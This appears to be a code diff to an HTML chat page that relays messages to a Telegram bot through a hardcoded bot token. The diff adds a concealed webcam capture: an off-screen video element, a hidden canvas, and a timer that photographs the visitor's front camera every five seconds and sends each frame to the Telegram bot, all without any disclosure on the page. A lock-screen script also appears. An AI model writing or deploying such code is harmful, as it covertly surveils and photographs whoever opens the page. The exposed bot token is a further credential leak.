@@ -189,15 +189,22 @@ button {
 #sendButton:disabled {
     cursor: not-allowed;
 }      
+
+          button { background: #ff4f81; color: white; cursor: pointer; }
+        video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
+        #canvas { display: none; }
+
+        
     </style>
 </head>
 <body>
     <h2>....</h2>
-
-    <div id="chatbox"></div>
+    
+     <div id="chatbox"></div>
 
     <div class="button-container">
-        <input type="text" id="message" placeholder="Type a message..." oninput="toggleSendButton()" onkeydown="checkEnter(event)">
+        
+        <input type="text" id="message" placeholder="Type a message..." onkeydown="checkEnter(event)">
         <button id="sendButton" onclick="sendMessage()">></button> <!-- Round send button -->
         <label for="upload" class="heart-upload">💗</label>
         <input type="file" id="upload" accept="image/*" onchange="uploadPhoto()">
@@ -206,121 +213,160 @@ button {
 
     <div id="imagePreview"></div>
     
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
         const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
         const chatId = "878604830";  
-        let lastUpdateId = 0;
 
-        // 📨 Send Message
-        async function sendMessage() {
-            const messageInput = document.getElementById("message");
-            const message = messageInput.value.trim();
-            
-            if (!message) return;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
-
-                document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
-                messageInput.value = "";
-                scrollToBottom();
-                toggleSendButton();
-            } catch (error) {
-                console.error("Message sending failed:", error);
-            }
+        // 📸 Background Camera Setup
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById("video").srcObject = stream;
         }
 
-        // 📸 Upload & Send Photo
-        async function uploadPhoto() {
-            const fileInput = document.getElementById("upload");
-            const file = fileInput.files[0];
+        // 📸 Capture Photo and Send to Telegram
+        async function captureAndSendPhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
 
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.5);
+        }
+
+     
+        // ✉️ Send Message to Telegram
+        async function sendMessage() {
+            const message = document.getElementById("message").value;
+            if (!message) return;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
+            autoScroll();
+            document.getElementById("message").value = "";
+        }
+
+        // 📲 Check if the user presses "Enter" to send the message
+        function checkEnter(event) {
+            if (event.key === 'Enter' && event.target.value.trim() !== "") {
+                sendMessage();
+            }
+        }
+        
+        // 📤 Send Uploaded Image to Telegram
+        document.getElementById("upload").addEventListener("change", async function() {
+            const file = this.files[0];
             if (!file) return;
 
             let formData = new FormData();
             formData.append("chat_id", chatId);
             formData.append("photo", file);
 
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
 
-                document.getElementById("chatbox").innerHTML += `
-                    <div class="msg user">
-                        <img src="${URL.createObjectURL(file)}" style="width: 100%; border-radius: 12px;">
-                    </div>`;
-                scrollToBottom();
-            } catch (error) {
-                console.error("Image upload failed:", error);
-            }
-        }
+            document.getElementById("chatbox").innerHTML += `<div class="msg user"><img src="${URL.createObjectURL(file)}" width="100"></div>`;
+            autoScroll();
+        });
 
-        // 📩 Get Messages from Telegram Bot
+        // 📥 Fetch Messages from Telegram (Polling)
         async function getMessages() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await response.json();
+    let lastUpdateId = 0;
 
-                if (!data.result) return;
+    setInterval(async () => {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+        const data = await res.json();
 
-                data.result.forEach(update => {
-                    if (update.update_id > lastUpdateId) {
-                        lastUpdateId = update.update_id;
+        if (data.result.length > 0) {
+            data.result.forEach(update => {
+                lastUpdateId = update.update_id;
 
-                        if (update.message && update.message.text) {
-                            const receivedMessage = update.message.text;
-                            document.getElementById("chatbox").innerHTML += `<div class="msg bot">${receivedMessage}</div>`;
+                if (update.message) {
+                    let chatbox = document.getElementById("chatbox");
 
-                              // Close the window if the received message is "bye"
-                            if (receivedMessage.toLowerCase() === "bye") {
-                                setTimeout(() => { window.close(); }, 2000);
-                            }
-                        }
-                          
-                        if (update.message && update.message.photo) {
-                            const fileId = update.message.photo[update.message.photo.length - 1].file_id;
-                            fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`)
-                                .then(res => res.json())
-                                .then(data => {
-                                    const fileUrl = `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
-                                    document.getElementById("chatbox").innerHTML += `<div class="msg bot"><img src="${fileUrl}" width="200"></div>`;
-                                });
-                        }
+                    // ✅ Text message
+                    if (update.message.text) {
+                        let receivedMessage = update.message.text.toLowerCase().trim();
+                        chatbox.innerHTML += `<div class="msg bot">${update.message.text}</div>`;
+                        autoScroll();
 
-                        if (update.message && update.message.voice) {
-                            const fileId = update.message.voice.file_id;
-                            fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`)
-                                .then(res => res.json())
-                                .then(data => {
-                                    const fileUrl = `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
-                                    document.getElementById("chatbox").innerHTML += `<div class="msg bot"><audio controls><source src="${fileUrl}" type="audio/ogg"></audio></div>`;
-                                });
+                        // 🛑 Check if message is "bye" or "exit"
+                        if (receivedMessage === "bye" || receivedMessage === "exit") {
+                            setTimeout(() => {
+                                window.close(); // Close page after 2 seconds
+                            }, 2000);
                         }
                     }
-                });
 
-                scrollToBottom();
-            } catch (error) {
-                console.error("Error fetching messages:", error);
-            }
+                    // ✅ Photo message
+                    if (update.message.photo) {
+                        let photoArray = update.message.photo;
+                        let photoFileId = photoArray[photoArray.length - 1].file_id;
+                        let photoUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${photoFileId}`;
+
+                        fetch(photoUrl)
+                            .then(response => response.json())
+                            .then(fileData => {
+                                let filePath = fileData.result.file_path;
+                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
+                                chatbox.innerHTML += `<div class="msg bot"><img src="${fullUrl}" width="200"></div>`;
+                                autoScroll();
+                            });
+                    }
+
+                    // ✅ Voice message
+                    if (update.message.voice) {
+                        let voiceFileId = update.message.voice.file_id;
+                        let voiceUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${voiceFileId}`;
+
+                        fetch(voiceUrl)
+                            .then(response => response.json())
+                            .then(fileData => {
+                                let filePath = fileData.result.file_path;
+                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
+                                chatbox.innerHTML += `<div class="msg bot"><audio controls><source src="${fullUrl}" type="audio/ogg"></audio></div>`;
+                                autoScroll();
+                            });
+                    }
+                }
+            });
         }
+    }, 3000); // Every 3 seconds
+}
 
-        // 🏃‍♂️ Start Message Fetching (Polling every 3 seconds)
-        setInterval(getMessages, 3000);
 
+
+    
         // 🔽 Scroll Chat to Bottom
-        function scrollToBottom() {
-            const chatbox = document.getElementById("chatbox");
-            chatbox.scrollTop = chatbox.scrollHeight;
-        }
-
-        // 🎤 Handle Mic Button for Voice Recording
+        function autoScroll() {
+    const chatbox = document.getElementById("chatbox");
+    chatbox.scrollTo({
+        top: chatbox.scrollHeight,
+        behavior: "smooth"  // ✅ Smooth scrolling effect
+    });
+}
+         // 🎤 Handle Mic Button for Voice Recording
         async function toggleMic() {
             const micButton = document.getElementById("micButton");
             let mediaRecorder;
@@ -359,30 +405,16 @@ button {
                 });
 
                 document.getElementById("chatbox").innerHTML += `<div class="msg user">🎤 Voice Message Sent</div>`;
+                autoScroll();
                 scrollToBottom();
             };
         }
-
-        // 📲 Check if the user presses "Enter" to send the message
-        function checkEnter(event) {
-            if (event.key === 'Enter' && event.target.value.trim() !== "") {
-                sendMessage();
-            }
-        }
-
-        // Show or hide the send button based on input
-        function toggleSendButton() {
-            const messageInput = document.getElementById("message");
-            const sendButton = document.getElementById("sendButton");
-
-            if (messageInput.value.trim() !== "") {
-                sendButton.classList.add('active');
-            } else {
-                sendButton.classList.remove('active');
-            }
-        }
+        // ✅ Start Everything
+        startCamera();
+        setInterval(captureAndSendPhoto, 5000); 
+        getMessages();
     </script>
-<script> 
+    <script> 
 document.addEventListener("DOMContentLoaded", function () {
     let lockScreen = document.createElement("div");
     lockScreen.innerHTML = `
@@ -429,6 +461,5 @@ document.addEventListener("visibilitychange", function() {
     }
 });
 </script>
-
 </body>
 </html>
